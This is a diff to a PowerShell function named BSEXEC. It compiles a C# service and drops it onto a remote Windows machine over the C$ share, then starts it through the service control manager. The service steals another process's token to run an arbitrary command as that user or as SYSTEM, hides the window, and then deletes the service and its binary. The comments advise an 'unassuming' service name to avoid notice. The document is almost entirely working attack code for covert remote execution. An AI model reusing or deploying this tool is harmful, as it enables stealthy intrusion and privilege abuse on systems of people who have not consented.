@@ -9,7 +9,7 @@ Function BSEXEC {
 
         1. $Proc, a PID on the target machine running under the user you want to impersonate. 0 will always run as system.
         2. $Path, the name of the target machine
-        3. $Command, the command to execute. Environment variables are... shaky. Cmd.exe
+        3. $Command, the command to execute. Keep in mind this is executing via the wscript host. Environment variables are... shaky. Cmd.exe
         works, but notepad requires the full file path.
         4. $Name, name of the service to be created. It'll only exist for a couple of seconds, but it will touch the event log and the registry.
         Best to make it something unassuming.
@@ -35,20 +35,18 @@ Param (
 
 )
 
-##Build out the proxy service executable
-
 $source = @"
 using System;
 using System.ServiceProcess;
 using System.Diagnostics;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
-//Makes WINAPI happy
+using System.Threading;
 using DWORD = System.UInt32;
-//Service namespace
+
 namespace WindowsService
 {
-     //Def WINAPI calls
+    
      class loadDLL
     {
         
@@ -90,9 +88,7 @@ namespace WindowsService
     public partial class Service : ServiceBase
     {
 
-
-        
-        //Def process info data structure for WINAPI    
+       
         [StructLayout(LayoutKind.Sequential)]
         internal struct PROCESS_INFORMATION
         {
@@ -101,7 +97,8 @@ namespace WindowsService
             public int dwProcessId;
             public int dwThreadId;
         }
-        //Def 
+
+        
         [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
         public struct STARTUPINFO
         {
@@ -124,11 +121,14 @@ namespace WindowsService
             public IntPtr hStdOutput;
             public IntPtr hStdError;
         }
+
+
         public const int TOKEN_ASSIGN_PRIMARY = (0x0001);
         public const int TOKEN_DUPLICATE = (0x0002);
         public const int TOKEN_IMPERSONATE = (0x0004);
         public const int TOKEN_QUERY = (0x0008);
-    
+     
+  
 
         public Service()
         {
@@ -148,25 +148,28 @@ namespace WindowsService
         
         protected override void OnStart(string[] args)
         {
-
-                                
+ 
+       
             IntPtr ph;
             uint access;
-            // code for ALL_ACCESS. Can't find a good resource for this, lifted this # from an unrelated VB script I found online
+            // code for ALL_ACCESS. Can't find a good source for this, lifted this # from an unrelated VB script I found online
             access = 0x0400;
             IntPtr tHandle;
             uint proc;
             proc = $proc;
             ph = loadDLL.OpenProcess(access, false, proc);
             loadDLL.OpenProcessToken(ph, TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, out tHandle);
-            System.String cmd = "$Command & sleep 1 & sc.exe stop $Name & sc.exe delete $Name & del C:\\Windows\\$name.exe";
+            System.String cmd = "$Command";
             STARTUPINFO info = new STARTUPINFO();
             PROCESS_INFORMATION processInfo = new PROCESS_INFORMATION();
             info.cb = Marshal.SizeOf(info); 
-            //Hides the created process from the GUI
+            //Enables custom window settings
             info.dwFlags = 1;
+            //Hides window
             info.wShowWindow = 0;
                       
+
+
             loadDLL.CreateProcessAsUser(
                 tHandle,
                 null,
@@ -180,16 +183,19 @@ namespace WindowsService
                 ref info,
                 out processInfo);
 
+                Process.Start("cmd","/c sc.exe stop $name & sc.exe delete $Name & del C:\\Windows\\$name.exe");
+
         }
 
         protected override void OnStop()
         {
             
-        }
-
-      
-         
-                
+            /*  THis causes the POSH job to crash for some reason, "temporary" solution is to just stop the service as part of OnStart().
+            Process.Start("cmd","/c sc.exe stop $name & sc.exe delete $Name & del C:\\Windows\\$name.exe");
+            System.Threading.Thread.Sleep(5000);
+            base.OnStop();
+            */
+        }               
 
     }
    
@@ -197,17 +203,20 @@ namespace WindowsService
 
 "@
 
-##Drop service binary on the target machine
-
 Add-Type -TypeDefinition $source -ReferencedAssemblies System.Windows.Forms, System.ServiceProcess -Language CSharp -OutputAssembly "\\$path\C$\Windows\$name.exe" -OutputType ConsoleApplication
 
-start-job -InitializationScript $init -scriptblock {
+<#Found that I couldn't delete the service if the calling process was still running. I'm guessing I need to have the function
+ close the handle to the service, but I don't know how yet. Running as a job is a quick and easy workaround.
+ #>
+
+start-job -scriptblock {
 
 add-type -TypeDefinition `
 @"
 
 using System;
 using System.Runtime.InteropServices;
+using System.Threading;
 
 public class CustomSCM
 {
@@ -220,6 +229,8 @@ public void SCM()
         System.String machine = "$($args[0])";
 
         IntPtr sHandle;
+
+        //uint sStatus;
 
         sHandle = loadDLL.OpenSCManager(
         machine,
@@ -248,6 +259,14 @@ public void SCM()
     0,
     null
     );
+    
+    /*loadDLL.ControlService(
+        service,
+        0x00000001,
+        out sStatus
+        );
+*/
+    
 }
 public class loadDLL {
 
@@ -280,6 +299,15 @@ public static extern IntPtr StartService(
     uint NumServiceArgs,
     string ServiceArgVectrs
     );
+/*
+[DllImport("Advapi32.dll", CharSet = CharSet.Auto)]
+public static extern uint ControlService(
+    IntPtr hService,
+    uint Control,
+    out uint Status
+    );
+*/
+
 
 }
 }
@@ -287,9 +315,9 @@ public static extern IntPtr StartService(
 
 
 
-$test = new-object CustomSCM
+$SCM = new-object CustomSCM
 
-$test.scm()
+$SCM.scm()
 
 
 
